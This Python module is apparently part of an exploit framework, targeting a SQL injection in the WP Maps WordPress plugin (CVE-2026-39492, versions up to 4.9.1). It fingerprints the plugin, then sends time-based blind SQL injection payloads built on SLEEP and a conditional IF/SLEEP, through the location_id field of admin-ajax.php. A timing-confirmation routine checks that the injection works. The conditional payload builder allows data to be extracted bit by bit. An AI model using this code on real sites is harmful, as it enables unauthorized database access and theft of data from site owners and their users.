#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""WP Maps (wp-google-map-plugin) helpers for CVE-2026-39492."""

from __future__ import annotations

import random
import time
from typing import List, Optional, Tuple

from core.framework.base_module import BaseModule

WP_MAPS_SLUG = "wp-google-map-plugin"
WP_MAPS_VULN_MAX = "4.9.1"
WP_MAPS_PATCHED_VERSION = "4.9.2"
WP_MAPS_AJAX_ACTION = "wpgmp_ajax_call"
WP_MAPS_AJAX_METHOD = "wpgmp_return_final_capability"
WP_MAPS_AJAX_PATH = "/wp-admin/admin-ajax.php"

WP_MAPS_MARKERS = (
    "wp-google-map-plugin",
    "wp maps",
    "flippercode",
    "wpgmp",
    "google map",
)


class WpMaps(BaseModule):
    """WP Maps plugin mixin for scanner/exploit modules."""

    @staticmethod
    def wp_maps_sleep_payload(secs: int) -> str:
        seconds = max(0, int(secs))
        return f"`1` AND SLEEP({seconds}) AND `1`=`1` LIMIT 1"

    @staticmethod
    def wp_maps_if_payload(condition: str, delay: int = 3) -> str:
        seconds = max(0, int(delay))
        condition = (condition or "1=1").strip()
        return f"`1` AND IF(({condition}), SLEEP({seconds}), 0) AND `1`=`1` LIMIT 1"

    @classmethod
    def wp_maps_is_vulnerable(cls, version: str) -> Optional[bool]:
        if not version:
            return None
        try:
            from lib.protocols.http.wordpress import Wordpress

            current = Wordpress.wp_version_to_tuple(version)
            maximum = Wordpress.wp_version_to_tuple(WP_MAPS_VULN_MAX)
            while len(current) < 3:
                current = current + (0,)
            while len(maximum) < 3:
                maximum = maximum + (0,)
            return current[:3] <= maximum[:3]
        except Exception:
            return None

    def wp_maps_ajax_path(self, wp_base: str = "") -> str:
        from lib.protocols.http.wordpress import Wordpress

        root = Wordpress.wp_normalize_base_path(wp_base or getattr(self, "path", "/"))
        path = f"{root.rstrip('/')}{WP_MAPS_AJAX_PATH}"
        return path if path.startswith("/") else f"/{path}"

    def wp_maps_post_data(self, location_id: str) -> dict:
        return {
            "action": WP_MAPS_AJAX_ACTION,
            "method": WP_MAPS_AJAX_METHOD,
            "location_id": location_id,
        }

    def wp_maps_probe(self, wp_base: str = "") -> dict:
        from lib.protocols.http.wordpress import Wordpress

        root = Wordpress.wp_normalize_base_path(wp_base or getattr(self, "path", "/"))
        version = self.wp_plugin_version(WP_MAPS_SLUG, root)
        if version:
            readme = Wordpress.wp_plugin_path(root, WP_MAPS_SLUG, "readme.txt")
            return {"found": True, "version": version, "evidence": readme}

        readme = Wordpress.wp_plugin_path(root, WP_MAPS_SLUG, "readme.txt")
        response = self.http_request(method="GET", path=readme, allow_redirects=True)
        if response and int(response.status_code or 0) == 200:
            body = response.text or ""
            lowered = body.lower()
            if any(marker in lowered for marker in WP_MAPS_MARKERS):
                return {
                    "found": True,
                    "version": Wordpress.wp_extract_version_from_readme(body) or None,
                    "evidence": readme,
                }

        main_php = Wordpress.wp_plugin_path(root, WP_MAPS_SLUG, "wp-google-map-plugin.php")
        response = self.http_request(method="GET", path=main_php, allow_redirects=True)
        if response and int(response.status_code or 0) == 200:
            body = (response.text or "").lower()
            if WP_MAPS_SLUG in body or "wpgmp" in body:
                return {"found": True, "version": None, "evidence": main_php}

        return {"found": False, "version": None, "evidence": None}

    def wp_maps_endpoint_alive(self, wp_base: str = "") -> Tuple[bool, Optional[str]]:
        response = self.http_request(
            method="POST",
            path=self.wp_maps_ajax_path(wp_base),
            data=self.wp_maps_post_data("1"),
            allow_redirects=True,
            timeout=int(getattr(self, "timeout", None) or 15),
        )
        if not response:
            return False, "no response"
        status = int(response.status_code or 0)
        if status in (404, 405, 400):
            return False, f"HTTP {status}"
        return True, None

    def wp_maps_post_elapsed(
        self,
        location_id: str,
        wp_base: str = "",
        timeout: Optional[float] = None,
    ) -> float:
        limit = float(timeout or getattr(self, "timeout", None) or 15)
        if "SLEEP" in (location_id or "").upper():
            limit = max(limit, 20.0)
        started = time.perf_counter()
        try:
            self.http_request(
                method="POST",
                path=self.wp_maps_ajax_path(wp_base),
                data=self.wp_maps_post_data(location_id),
                allow_redirects=True,
                timeout=limit,
            )
        except Exception:
            pass
        return time.perf_counter() - started

    def wp_maps_baseline(
        self,
        wp_base: str = "",
        max_samples: int = 10,
    ) -> Tuple[float, float, float, int]:
        samples: List[float] = []
        target_samples = 5
        for _ in range(max_samples):
            samples.append(self.wp_maps_post_elapsed("1", wp_base))
            if len(samples) >= 3:
                average = sum(samples) / len(samples)
                if average > 8:
                    target_samples = 3
                    break
            time.sleep(0.1)

        samples = samples[:target_samples]
        if len(samples) < 3:
            average = sum(samples) / max(len(samples), 1)
            return average, 0.0, max(average + 1.0, 0.5), len(samples)

        average = sum(samples) / len(samples)
        variance = sum((value - average) ** 2 for value in samples) / len(samples)
        sigma = variance ** 0.5
        threshold = max(average + 7 * sigma, 0.5)
        return average, sigma, threshold, len(samples)

    def wp_maps_timed_check(
        self,
        sleep_seconds: int,
        threshold: float,
        wp_base: str = "",
    ) -> bool:
        elapsed = self.wp_maps_post_elapsed(
            self.wp_maps_sleep_payload(sleep_seconds),
            wp_base,
        )
        return elapsed >= threshold

    def wp_maps_confirm_sqli(self, wp_base: str = "") -> Tuple[bool, float]:
        average, sigma, threshold, sample_count = self.wp_maps_baseline(wp_base)
        if sample_count < 3 or sigma > 3.0:
            return False, average

        if not self.wp_maps_timed_check(5, threshold, wp_base):
            return False, average
        if self.wp_maps_timed_check(0, threshold, wp_base):
            return False, average
        if not self.wp_maps_timed_check(5, threshold, wp_base):
            return False, average

        for value in (random.randint(3, 7) for _ in range(3)):
            if not self.wp_maps_timed_check(value, threshold, wp_base):
                return False, average

        return True, threshold + 5
